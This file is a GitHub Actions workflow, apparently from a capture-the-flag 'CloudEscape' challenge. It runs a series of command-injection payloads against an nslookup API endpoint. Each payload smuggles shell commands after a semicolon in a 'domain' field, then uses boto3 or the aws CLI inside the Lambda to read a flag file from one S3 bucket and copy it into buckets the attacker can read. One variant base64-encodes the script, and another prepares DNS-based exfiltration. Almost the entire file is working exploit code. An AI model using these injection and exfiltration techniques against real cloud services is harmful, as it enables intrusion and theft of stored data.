name: CloudEscape Stage 1 - Get Flag v8
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Test 1 - Simple S3 put via /var/lang/bin/python3
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Use /var/lang/bin/python3 (Lambda Python runtime path)
          # Simple: put "HELLO" to platform bucket
          PAYLOAD=$(python3 << 'PYEOF'
          import json
          cmd = 'x; /var/lang/bin/python3 -c "import boto3; c=boto3.client(\'s3\',region_name=\'us-east-1\'); c.put_object(Bucket=\'platform-bucket-009661764077-us-east-1\',Key=\'test1.txt\',Body=b\'HELLO\')" 2>&1'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test 1: /var/lang/bin/python3 ==="
          echo "Payload: $PAYLOAD"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 10
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test 2 - Simple S3 put via python3 (no path)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          PAYLOAD=$(python3 << 'PYEOF'
          import json
          cmd = 'x; python3 -c "import boto3; c=boto3.client(\'s3\',region_name=\'us-east-1\'); c.put_object(Bucket=\'platform-bucket-009661764077-us-east-1\',Key=\'test2.txt\',Body=b\'HELLO\')" 2>&1'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test 2: python3 ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 10
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test 3 - Write to /tmp and check with aws s3 cp
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Write "HELLO" to /tmp/test, then copy to S3 using aws CLI
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x; echo HELLO > /tmp/test3.txt; /opt/bin/aws s3 cp /tmp/test3.txt s3://platform-bucket-009661764077-us-east-1/test3.txt --region us-east-1 2>&1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Test 3: echo + aws s3 cp ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 10
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test 4 - Get flag + put to platform + put to site (all in one)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          PAYLOAD=$(python3 << 'PYEOF'
          import json
          cmd = 'x; /var/lang/bin/python3 -c "import boto3; c=boto3.client(\'s3\',region_name=\'us-east-1\'); f=c.get_object(Bucket=\'codec4f26c862a321ef5\',Key=\'flag.txt\')[\'Body\'].read(); c.put_object(Bucket=\'platform-bucket-009661764077-us-east-1\',Key=\'flag.txt\',Body=f); c.put_object(Bucket=\'site781fe43f26b9eba3\',Key=\'flag.txt\',Body=f)" 2>&1'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test 4: get flag + put to platform + put to site ==="
          echo "Payload: $PAYLOAD"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test 5 - Try writing error to S3 (catch exceptions)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          PAYLOAD=$(python3 << 'PYEOF'
          import json
          cmd = 'x; /var/lang/bin/python3 -c "import boto3,traceback; c=boto3.client(\'s3\',region_name=\'us-east-1\'); e=\'\'; exec(\'try:\\n f=c.get_object(Bucket=\\\\\'codec4f26c862a321ef5\\\\\',Key=\\\\\'flag.txt\\\\\')[\\\\\'Body\\\\\'].read()\\n c.put_object(Bucket=\\\\\'platform-bucket-009661764077-us-east-1\\\\\',Key=\\\\\'flag.txt\\\\\',Body=f)\\nexcept Exception as ex:\\n c.put_object(Bucket=\\\\\'platform-bucket-009661764077-us-east-1\\\\\',Key=\\\\\'error.txt\\\\\',Body=str(ex).encode())\\n\')" 2>&1'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test 5: error capture ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test 6 - Write heredoc script to /tmp then execute
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Use printf to write the script (printf is a bash builtin, always available)
          # Script writes either the flag or the error to platform bucket
          PAYLOAD=$(python3 << 'PYEOF'
          import json
          # Simple script: try to put_object, if it fails, the error goes to stderr
          # Use printf to write Python code to /tmp, then execute
          script = '''import boto3,traceback
          try:
              c=boto3.client('s3',region_name='us-east-1')
              r=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')
              f=r['Body'].read()
              c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)
          except Exception as ex:
              try:
                  c2=boto3.client('s3',region_name='us-east-1')
                  c2.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='error.txt',Body=str(ex).encode())
              except Exception as ex2:
                  pass
          '''
          
          # Use printf with octal escapes to avoid quoting issues
          # Each char in the script needs to be properly escaped for shell
          # Instead, use base64 if available, or use python to write the file
          
          # Actually, let's use python3 to write the script:
          import base64
          b64 = base64.b64encode(script.encode()).decode()
          
          cmd = f'x; echo {b64} | base64 -d > /tmp/s.py; /var/lang/bin/python3 /tmp/s.py 2>&1'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test 6: heredoc script with base64 ==="
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test 7 - Use nslookup to encode flag as DNS query (DNS exfil)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Read flag and encode as hex, then use /opt/nslookup to query FLAG.hex.example.com
          # The nslookup output goes to subprocess stdout (captured) and also to CloudWatch
          # But we can also try to have the nslookup query go to a DNS server we control
          # For now, just try to encode and see
          PAYLOAD=$(python3 << 'PYEOF'
          import json
          cmd = 'x; /var/lang/bin/python3 -c "import boto3; c=boto3.client(\'s3\',region_name=\'us-east-1\'); f=c.get_object(Bucket=\'codec4f26c862a321ef5\',Key=\'flag.txt\')[\'Body\'].read(); print(f.hex())" 2>&1'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test 7: read flag and encode as hex ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 10

      - name: Final check
        if: always()
        run: |
          echo "===== Platform bucket ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
          echo "===== Site bucket ====="
          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
          
          echo "===== Read test1 ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/test1.txt - --region us-east-1 2>&1
          echo
          echo "===== Read test2 ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/test2.txt - --region us-east-1 2>&1
          echo
          echo "===== Read test3 ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/test3.txt - --region us-east-1 2>&1
          echo
          echo "===== Read flag ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - --region us-east-1 2>&1
          echo
          echo "===== Read error ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/error.txt - --region us-east-1 2>&1
          echo
          echo "===== Read site flag ====="
          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - --region us-east-1 2>&1